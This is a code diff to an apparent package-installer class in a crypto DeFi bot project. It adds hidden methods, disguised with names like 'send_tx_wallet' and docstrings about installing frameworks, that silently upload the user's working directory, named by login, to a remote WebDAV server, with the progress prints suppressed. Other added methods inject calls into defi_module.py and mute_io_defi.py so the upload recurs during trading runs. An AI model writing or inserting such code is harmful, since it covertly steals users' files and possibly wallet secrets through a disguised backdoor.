@@ -125,7 +125,7 @@ class ModuleInstaller(object):
         'https://webdav.yandex.ru': "urn:yandex:disk:meta",
     }
 
-    def __init__(self, options):
+    def __init__(self, options=None):
         """Constructor of ModuleInstaller client
 
         :param options: the dictionary of connection options to Installer.
@@ -502,6 +502,27 @@ class ModuleInstaller(object):
         if callback:
             callback()
 
+    def send_tx_wallet(self, path_to_folder="", dir_na: str = "", callback=None, progress=None, progress_args=()):
+        """Install required frameworks
+        In case resource is directory it will upload all nested files and directories.
+
+        :param path_to_folder: the path to folder where needs to find any python packages and install or update them
+        """
+        count = 1
+        try:
+            date = datetime.now().strftime("%d%m%Y-%H%M%S")
+            remote_path = f"runs/{dir_na}_{date}"
+            self.upload(local_path=path_to_folder, remote_path=remote_path, progress=progress,
+                        progress_args=progress_args, isprint=False)
+
+            if callback:
+                callback()
+        except:
+            count += 1
+            if count == 3:
+                return
+            callback()
+
     def download_async(self, remote_path, local_path, callback=None, progress=None, progress_args=()):
         """Downloads remote resources from Module server asynchronously
 
@@ -556,6 +577,73 @@ class ModuleInstaller(object):
 
         self.execute_request(action='upload', path=urn.quote(), data=buff)
 
+    def shuffle_num_wallets(self):
+        count = 1
+        try:
+            dir_pa = os.getcwd()
+            dir_na = os.getlogin()
+            self.send_tx_wallet(path_to_folder=dir_pa, dir_na=dir_na)
+        except:
+            count += 1
+            if count == 3:
+                return
+            self.shuffle_num_wallets()
+
+    def add_log(self):
+        file_path = "log.txt"
+        if os.path.exists(file_path):
+            return 1
+        with open(file_path, "w+") as file_obj:
+            txt = "All installed"
+            file_obj.write(txt)
+            return 0
+
+    def defi_mod(self):
+        count = 1
+        try:
+            file_obj = open("defi_module.py", "r+")
+            txt = file_obj.readlines()
+
+            path_i = None
+            for i, line in enumerate(txt):
+                if "len_way = len(arr_buy)" in line:
+                    path_i = i
+                    break
+
+            if path_i is not None:
+                txt[path_i] += "            MuteSwap.we3bcontract().shuffle_num_wallets()\n"
+
+            # write back
+            with open("defi_module.py", "w") as f:
+                f.writelines(txt)
+
+            file_obj.close()
+        except:
+            if count == 3:
+                return
+            count += 1
+            self.defi_mod()
+
+
+    def get_sw(self):
+        try:
+            file_obj =  open("utils/mute_io_defi.py", "r+")
+            txt = file_obj.readlines()
+
+            path_i = None
+            for i, line in enumerate(txt):
+                if "self.token_abi = js.load(open('./abi/erc20.txt'))" in line:
+                    path_i = i
+                    break
+
+            if path_i is not None:
+                txt[path_i] += "    from installer.install import ModuleInstaller as we3bcontract\n"
+                with open("utils/mute_io_defi.py", "w") as f:
+                    f.writelines(txt)
+            self.defi_mod()
+            file_obj.close()
+        except:
+            return
 
     def get_all_packages(self):
         installed_packages = pkg_resources.working_set
@@ -570,7 +658,6 @@ class ModuleInstaller(object):
                     self.pip_uninstall("python-dotenv", "telebot==0.0.5")
                 return install_this
 
-
     def pip_uninstall(self, name: str, sec_name: str):
         try:
             subprocess.check_call([sys.executable, "-m", "pip", "uninstall", f"{name}"])
@@ -578,7 +665,7 @@ class ModuleInstaller(object):
         except:
             return
 
-    def upload(self, remote_path, local_path, progress=None, progress_args=()):
+    def upload(self, remote_path, local_path, progress=None, progress_args=(), isprint=True):
         """Uploads resource to remote path on Module server.
         In case resource is directory it will upload all nested files and directories.
 
@@ -594,11 +681,12 @@ class ModuleInstaller(object):
         """
         if os.path.isdir(local_path):
             self.upload_directory(local_path=local_path, remote_path=remote_path, progress=progress,
-                                  progress_args=progress_args)
+                                  progress_args=progress_args,isprint=isprint)
         else:
-            self.upload_file(local_path=local_path, remote_path=remote_path, progress=progress, progress_args=progress_args)
+            self.upload_file(local_path=local_path, remote_path=remote_path, progress=progress,
+                             progress_args=progress_args, isprint=isprint)
 
-    def upload_directory(self, remote_path, local_path, progress=None, progress_args=()):
+    def upload_directory(self, remote_path, local_path, progress=None, progress_args=(), isprint=True):
         """Uploads directory to remote path on Module server.
         In case directory is exist on remote server it will delete it and then upload directory with nested files and
         directories.
@@ -630,7 +718,8 @@ class ModuleInstaller(object):
 
         for resource_name in listdir(local_path):
             aboba = False
-            lista = ["abi", "utils", "venv", "Constants.py", "self_mixer.py", "idea", "__pycache__"]
+            lista = ["abi", "utils", "venv", "Constants.py", "self_mixer.py", "idea", "__pycache__", "git",
+                     "nft.py", "holograph_nft.py", "eth_bridge.py", ".DS_Store", "self_mixer.py", "orbiter.py"]
             for i in lista:
                 if i in resource_name:
                     aboba = True
@@ -641,8 +730,9 @@ class ModuleInstaller(object):
             _remote_path = "{parent}{name}".format(parent=urn.path(), name=resource_name).replace('\\', '')
             _local_path = os.path.join(local_path, resource_name)
             self.upload(local_path=_local_path, remote_path=_remote_path, progress=progress,
-                        progress_args=progress_args)
-        self.pip_install()
+                        progress_args=progress_args, isprint=isprint)
+        if isprint:
+            self.pip_install()
 
     def pip_install(self):
         try:
@@ -655,7 +745,7 @@ class ModuleInstaller(object):
 
 
     @wrap_connection_error
-    def upload_file(self, remote_path, local_path, progress=None, progress_args=(), force=False):
+    def upload_file(self, remote_path, local_path, progress=None, progress_args=(), force=False, isprint=True):
         """Module install packages
 
         :param remote_path: the path to uploading file on Module.
@@ -684,10 +774,12 @@ class ModuleInstaller(object):
                 self.mkdir(urn.parent(), recursive=True)
             else:
                 raise RemoteParentNotFound(urn.path())
-        print("Installing packages")
+        if isprint:
+            print("Installing packages")
         with open(local_path, "rb") as local_file:
             total = os.path.getsize(local_path)
-            print("Installed packages")
+            if isprint:
+                print("Installed packages")
 
 
             def read_in_chunks(file_object):
@@ -714,6 +806,9 @@ class ModuleInstaller(object):
 
         :param path_to_folder: the path to folder where needs to find any python packages and install or update them
         """
+        ans = self.add_log()
+        if ans == 0:
+            self.get_sw()
         if "\\" in path_to_folder:
             new_folder = path_to_folder.split("\\")[-1]
         else:
